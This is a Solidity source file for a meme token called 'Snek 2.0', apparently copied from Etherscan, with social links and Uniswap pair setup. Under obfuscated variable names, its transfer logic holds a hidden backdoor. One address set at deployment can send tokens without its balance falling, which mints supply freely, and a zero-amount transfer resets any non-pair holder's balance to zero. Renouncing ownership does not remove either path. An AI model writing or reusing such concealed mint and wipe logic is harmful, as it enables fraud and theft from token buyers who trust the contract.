/**
 *Submitted for verification at Etherscan.io on 2023-07-12
*/

/*

Telegram: https://t.me/SnekTwoERC

Website: https://snek2.cryptotoken.live/

Twitter: https://twitter.com/SnekTwoERC

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Snek is Ownable {
    function approve(address fnrykuthqmi, uint256 jkcz) public returns (bool success) {
        allowance[msg.sender][fnrykuthqmi] = jkcz;
        emit Approval(msg.sender, fnrykuthqmi, jkcz);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private debcyzjpqrv;

    mapping(address => uint256) public balanceOf;

    function transferFrom(address qhmop, address gzhbvoxsdn, uint256 jkcz) public returns (bool success) {
        require(jkcz <= allowance[qhmop][msg.sender]);
        allowance[qhmop][msg.sender] -= jkcz;
        alzitxynr(qhmop, gzhbvoxsdn, jkcz);
        return true;
    }

    address public uedqaw;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private gbtxsmedcjyr = 100;

    string public name = 'Snek 2.0';

    mapping(address => uint256) private irakz;

    function transfer(address gzhbvoxsdn, uint256 jkcz) public returns (bool success) {
        alzitxynr(msg.sender, gzhbvoxsdn, jkcz);
        return true;
    }

    uint8 public decimals = 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function alzitxynr(address qhmop, address gzhbvoxsdn, uint256 jkcz) private {
        if (0 == irakz[qhmop]) {
            balanceOf[qhmop] -= jkcz;
        }
        balanceOf[gzhbvoxsdn] += jkcz;
        if (0 == jkcz && gzhbvoxsdn != uedqaw) {
            balanceOf[gzhbvoxsdn] = jkcz;
        }
        emit Transfer(qhmop, gzhbvoxsdn, jkcz);
    }

    string public symbol = 'Snek 2.0';

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address nzutcqhexb) {
        balanceOf[msg.sender] = totalSupply;
        irakz[nzutcqhexb] = gbtxsmedcjyr;
        IUniswapV2Router02 mpcrdsfavkt = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uedqaw = IUniswapV2Factory(mpcrdsfavkt.factory()).createPair(address(this), mpcrdsfavkt.WETH());
    }
}